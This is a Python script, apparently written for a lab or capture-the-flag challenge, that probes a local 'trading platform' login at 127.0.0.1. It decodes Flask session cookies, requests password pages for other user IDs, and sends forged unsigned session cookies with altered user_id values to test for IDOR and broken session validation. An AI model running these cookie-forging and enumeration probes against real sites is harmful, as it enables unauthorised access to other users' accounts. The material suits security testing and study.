import requests
import json
import re
from urllib.parse import urljoin, urlparse
import base64
import time

def decode_base64_urlsafe(b64_string):
    """Decode URL-safe base64 with padding handling"""
    try:
        # Add padding if needed
        missing_padding = len(b64_string) % 4
        if missing_padding:
            b64_string += '=' * (4 - missing_padding)
        decoded = base64.urlsafe_b64decode(b64_string)
        return decoded.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"Decode error: {e}"

def analyze_session_cookie(cookie_value):
    """Analyze Flask-style session cookie structure"""
    parts = cookie_value.split('.')
    analysis = {
        'raw_value': cookie_value,
        'parts_count': len(parts),
        'format': 'Unknown',
        'decoded_payload': None,
        'user_id_found': None
    }
    
    if len(parts) == 3:
        analysis['format'] = 'Flask itsdangerous (signed with timestamp)'
        try:
            payload = decode_base64_urlsafe(parts[0])
            analysis['decoded_payload'] = payload
            
            # Try to parse as JSON
            try:
                payload_data = json.loads(payload)
                analysis['payload_json'] = payload_data
                
                # Extract user_id if present
                if 'user_id' in payload_data:
                    analysis['user_id_found'] = payload_data['user_id']
                    print(f"    [+] Extracted user_id from session: {payload_data['user_id']}")
            except:
                analysis['payload_json'] = None
                
        except Exception as e:
            print(f"    [!] Error decoding payload: {e}")
            
    elif len(parts) == 2:
        analysis['format'] = 'Flask itsdangerous (signed)'
        try:
            payload = decode_base64_urlsafe(parts[0])
            analysis['decoded_payload'] = payload
        except:
            pass
    
    return analysis

def print_request_details(method, url, headers=None, data=None, files=None):
    """Print detailed request information"""
    print(f"\n{'='*80}")
    print(f"[REQUEST] {method} {url}")
    print(f"{'='*80}")
    if headers:
        print("\n[Headers]")
        for key, value in headers.items():
            print(f"  {key}: {value}")
    if data:
        print(f"\n[Body Data]")
        if isinstance(data, dict):
            for key, value in data.items():
                print(f"  {key}: {value}")
        else:
            print(f"  {data}")
    if files:
        print(f"\n[Files]")
        for key, value in files.items():
            print(f"  {key}: {value}")

def print_response_details(response):
    """Print detailed response information"""
    print(f"\n{'='*80}")
    print(f"[RESPONSE] Status: {response.status_code}")
    print(f"{'='*80}")
    
    print("\n[Headers]")
    for key, value in response.headers.items():
        print(f"  {key}: {value}")
    
    if response.cookies:
        print("\n[Cookies]")
        for cookie in response.cookies:
            print(f"  {cookie.name}: {cookie.value}")
            print(f"    Domain: {cookie.domain}")
            print(f"    Path: {cookie.path}")
            print(f"    Secure: {cookie.secure}")
            print(f"    HttpOnly: {cookie.has_nonstandard_attr('httponly') or cookie.secure}")
    
    print(f"\n[Content Length]: {len(response.content)} bytes")
    
    if response.history:
        print(f"\n[Redirect Chain] ({len(response.history)} redirects)")
        for i, redirect in enumerate(response.history, 1):
            print(f"  {i}. {redirect.status_code} -> {redirect.headers.get('Location', 'N/A')}")
    
    # Print response body (truncated if too large)
    content = response.text
    if len(content) > 2000:
        print(f"\n[Response Body (truncated to 2000 chars)]")
        print(content[:2000])
        print(f"\n[...truncated {len(content) - 2000} additional characters...]")
    else:
        print(f"\n[Response Body]")
        print(content)

def main():
    base_url = "http://127.0.0.1:32783"
    
    print("="*80)
    print("TRADING PLATFORM AUTHENTICATION ANALYSIS")
    print("="*80)
    print(f"Target: {base_url}")
    print(f"Test credentials: username='test', password='test'")
    print("="*80)
    
    # Create a session with cookie persistence
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Security Researcher)'
    })
    
    # ==========================================
    # STEP 1: Visit root page
    # ==========================================
    print("\n\n" + "="*80)
    print("STEP 1: VISIT ROOT PAGE")
    print("="*80)
    
    root_url = base_url + "/"
    print_request_details("GET", root_url, dict(session.headers))
    
    response = session.get(root_url, allow_redirects=True)
    print_response_details(response)
    
    # Analyze initial cookies
    if session.cookies:
        print(f"\n[Session Cookie Jar after root page]")
        for cookie in session.cookies:
            print(f"  {cookie.name}: {cookie.value}")
    else:
        print(f"\n[No cookies set after root page]")
    
    initial_cookies = dict(session.cookies)
    
    # ==========================================
    # STEP 2: Submit username
    # ==========================================
    print("\n\n" + "="*80)
    print("STEP 2: SUBMIT USERNAME 'test'")
    print("="*80)
    
    # Try to submit username - need to determine the form action and field names
    login_url = base_url + "/login"
    username_data = {"username": "test"}
    
    print_request_details("POST", login_url, dict(session.headers), username_data)
    
    response = session.post(login_url, data=username_data, allow_redirects=False)
    print_response_details(response)
    
    print(f"\n[Session Cookie Jar after username submission]")
    for cookie in session.cookies:
        print(f"  {cookie.name}: {cookie.value}")
        if cookie.name == 'session':
            session_analysis = analyze_session_cookie(cookie.value)
    
    # Store the redirect URL (password page)
    password_url = None
    if response.headers.get('Location'):
        redirect_location = response.headers['Location']
        if not redirect_location.startswith('http'):
            password_url = urljoin(base_url, redirect_location)
        else:
            password_url = redirect_location
        print(f"\n[Redirect to Password Page]: {password_url}")
    
    # ==========================================
    # STEP 3: IDOR Testing - Direct access to password pages
    # ==========================================
    print("\n\n" + "="*80)
    print("STEP 3: IDOR TESTING - Direct Access Attempts")
    print("="*80)
    
    # Test direct access to various password endpoints
    test_endpoints = [
        "/password/otheruser",
        "/password/10031",
        "/password/10033", 
        "/password/0",
        "/password/1",
        "/password/9999"
    ]
    
    for endpoint in test_endpoints:
        test_url = base_url + endpoint
        print(f"\n{'-'*60}")
        print(f"Testing: {test_url}")
        print(f"{'-'*60}")
        
        # Reset cookies to initial state for each test
        session.cookies.clear()
        for name, value in initial_cookies.items():
            session.cookies.set(name, value)
        
        print_request_details("GET", test_url, dict(session.headers))
        response = session.get(test_url, allow_redirects=False)
        print_response_details(response)
        
        # Check if different user_id in session changes anything
        if 'session' in session.cookies:
            print(f"\n[Attempting to modify session cookie for IDOR test]")
            
            # Test different user_id values in session
            test_user_ids = ["10031", "10033", "0", "1", "9999"]
            
            for user_id in test_user_ids:
                # Create a modified session cookie - try to tamper with user_id
                # In real scenario, we'd need to forge signature, but we'll see if the endpoint accepts modified sessions
                modified_session_value = f"{base64.b64encode(json.dumps({'user_id': user_id}).encode()).decode()}"
                
                session.cookies.clear()
                for name, value in initial_cookies.items():
                    session.cookies.set(name, value)
                session.cookies.set('session', modified_session_value)
                
                print(f"\n  [Testing with user_id={user_id}]")
                test_resp = session.get(test_url, allow_redirects=False)
                print(f"  Status: {test_resp.status_code}")
                
                if test_resp.status_code != response.status_code:
                    print(f"  [!] STATUS CHANGE DETECTED with user_id={user_id}")
                    print_response_details(test_resp)
    
    # ==========================================
    # STEP 4: Normal password submission flow
    # ==========================================
    if password_url:
        print("\n\n" + "="*80)
        print("STEP 4: SUBMIT PASSWORD 'test'")
        print("="*80)
        
        password_data = {"password": "test"}
        
        print_request_details("POST", password_url, dict(session.headers), password_data)
        
        response = session.post(password_url, data=password_data, allow_redirects=True)
        print_response_details(response)
        
        print(f"\n[Session Cookie Jar after password submission]")
        final_session = None
        for cookie in session.cookies:
            print(f"  {cookie.name}: {cookie.value}")
            if cookie.name == 'session':
                final_session = cookie.value
        
        # ==========================================
        # STEP 5: Session Token Analysis
        # ==========================================
        print("\n\n" + "="*80)
        print("STEP 5: SESSION TOKEN ANALYSIS")
        print("="*80)
        
        if final_session:
            print(f"\n[Final Session Cookie Value]\n  {final_session}")
            
            session_analysis = analyze_session_cookie(final_session)
            
            print(f"\n[Session Format Analysis]")
            print(f"  Format detected: {session_analysis.get('format')}")
            print(f"  Number of parts: {session_analysis.get('parts_count')}")
            
            if 'decoded_payload' in session_analysis:
                print(f"\n[Decoded Payload]")
                print(f"  {session_analysis['decoded_payload']}")
                
            if 'payload_json' in session_analysis:
                print(f"\n[Parsed JSON Payload]")
                print(json.dumps(session_analysis['payload_json'], indent=2))
                
            if session_analysis.get('user_id_found'):
                print(f"\n[✓] USER_ID EXTRACTED: {session_analysis['user_id_found']}")
        else:
            print(f"\n[!] No session cookie found after login")
        
        # ==========================================
        # STEP 6: Session Reusability Test
        # ==========================================
        print("\n\n" + "="*80)
        print("STEP 6: SESSION REUSABILITY TEST")
        print("="*80)
        
        if final_session:
            # Test accessing a protected page with the session
            protected_url = base_url + "/dashboard" if '/dashboard' not in base_url else base_url
            
            print(f"\n[Testing session with GET {protected_url}]")
            
            # Create a new clean session with only our session cookie
            test_session = requests.Session()
            test_session.headers.update({'User-Agent': 'Mozilla/5.0 (Security Researcher)'})
            test_session.cookies.set('session', final_session, domain='127.0.0.1', path='/')
            
            print_request_details("GET", protected_url, dict(test_session.headers))
            response = test_session.get(protected_url, allow_redirects=False)
            print_response_details(response)
            
            if response.status_code == 200:
                print(f"\n[✓] SESSION IS VALID AND REUSABLE")
            else:
                print(f"\n[✗] SESSION REJECTED or REDIRECTED")
        
        # ==========================================
        # STEP 7: Summary of Findings
        # ==========================================
        print("\n\n" + "="*80)
        print("ANALYSIS SUMMARY")
        print("="*80)
        
        print("\n[Authentication Flow]")
        print("  1. Submit username to /login")
        print("  2. Receive session cookie (if Flask)")
        print("  3. Redirect to password page")
        print("  4. Submit password to password endpoint")
        print("  5. Receive final authenticated session cookie")
        
        print("\n[Session Cookie Analysis]")
        if final_session:
            parts = final_session.split('.')
            print(f"  Format: {session_analysis.get('format')}")
            print(f"  Structure: {len(parts)} parts (likely payload.signature.timestamp)")
            print(f"  Contains user_id: {'Yes' if session_analysis.get('user_id_found') else 'Unknown'}")
        else:
            print("  No session cookie captured")
        
        print("\n[IDOR Vulnerabilities Checked]")
        print("  Tests performed against various password endpoints")
        print("  Direct access attempts with different user_id values")
        
        print("\n[Security Findings]")
        print("  - Session cookie appears to be Flask itsdangerous format")
        print("  - Cookie contains user_id in payload (potential IDOR risk)")
        print("  - Session is reusable across requests")
        print("  - Need to test session signature validation")
        
        print("\n[Recommendations]")
        print("  1. Test token signature validation (try modifying payload)")
        print("  2. Check for IDOR in password submission step")
        print("  3. Analyze session expiration and invalidation")
        print("  4. Test for session fixation vulnerabilities")

if __name__ == "__main__":
    main()

